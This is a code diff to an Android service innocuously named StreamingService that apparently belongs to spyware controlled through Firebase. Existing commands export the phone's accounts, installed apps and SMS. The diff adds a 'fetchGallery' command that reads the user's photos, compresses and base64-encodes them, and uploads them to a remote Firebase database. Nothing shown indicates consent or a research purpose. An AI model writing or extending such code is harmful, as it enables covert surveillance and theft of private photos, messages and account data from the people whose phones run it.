@@ -5,6 +5,7 @@ import android.accounts.AccountManager
 import android.app.*
 import android.app.usage.UsageStatsManager
 import android.content.*
+import android.content.ContentUris
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.graphics.*
@@ -285,6 +286,82 @@ class StreamingService : Service() {
             "exportAccounts" -> { Thread { exportAccountsToFirebase() }.start(); snapshot.ref.removeValue() }
             "getApps" -> { Thread { exportAppsList() }.start(); snapshot.ref.removeValue() }
             "getSMS" -> { Thread { exportSMSList() }.start(); snapshot.ref.removeValue() }
+            "fetchGallery" -> { Thread { exportGalleryPhotos(snapshot) }.start(); snapshot.ref.removeValue() }
+        }
+    }
+
+    private fun exportGalleryPhotos(snapshot: DataSnapshot) {
+        try {
+            val mode = snapshot.child("mode").getValue(String::class.java) ?: "latest"
+            val countLimit = snapshot.child("count").getValue(Long::class.java)?.toInt() ?: if (mode == "all") 200 else 10
+            
+            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+            val projection = arrayOf(
+                MediaStore.Images.Media._ID,
+                MediaStore.Images.Media.DISPLAY_NAME,
+                MediaStore.Images.Media.DATE_ADDED,
+                MediaStore.Images.Media.SIZE
+            )
+            
+            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
+            val cursor = contentResolver.query(uri, projection, null, null, sortOrder)
+            val photoList = mutableListOf<Map<String, Any>>()
+            
+            var processed = 0
+            cursor?.use {
+                val idCol = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
+                val nameCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
+                val dateCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
+                val sizeCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
+                
+                while (it.moveToNext() && processed < countLimit) {
+                    val id = it.getLong(idCol)
+                    val name = it.getString(nameCol) ?: "IMG_$id.jpg"
+                    val date = it.getLong(dateCol) * 1000L
+                    val size = it.getLong(sizeCol)
+                    
+                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
+                    
+                    // Create lightweight thumbnail base64
+                    var base64Str = ""
+                    try {
+                        contentResolver.openInputStream(contentUri)?.use { input ->
+                            val options = BitmapFactory.Options().apply {
+                                inSampleSize = 4 // Downsample for smooth memory & fast Firebase transfer
+                            }
+                            val bitmap = BitmapFactory.decodeStream(input, null, options)
+                            if (bitmap != null) {
+                                val out = ByteArrayOutputStream()
+                                bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
+                                val bytes = out.toByteArray()
+                                base64Str = "data:image/jpeg;base64," + Base64.encodeToString(bytes, Base64.NO_WRAP)
+                                bitmap.recycle()
+                            }
+                        }
+                    } catch (ex: Exception) {
+                        Timber.e(ex, "Error reading photo thumbnail")
+                    }
+                    
+                    if (base64Str.isNotEmpty()) {
+                        photoList.add(mapOf(
+                            "id" to id.toString(),
+                            "name" to name,
+                            "time" to date,
+                            "size" to size,
+                            "base64" to base64Str
+                        ))
+                        processed++
+                    }
+                }
+            }
+            
+            if (mode == "all") {
+                deviceRef?.child("media/gallery")?.setValue(photoList)
+            } else {
+                deviceRef?.child("media/recent")?.setValue(photoList)
+            }
+        } catch (e: Exception) {
+            Timber.e(e, "Error exporting gallery photos")
         }
     }
 
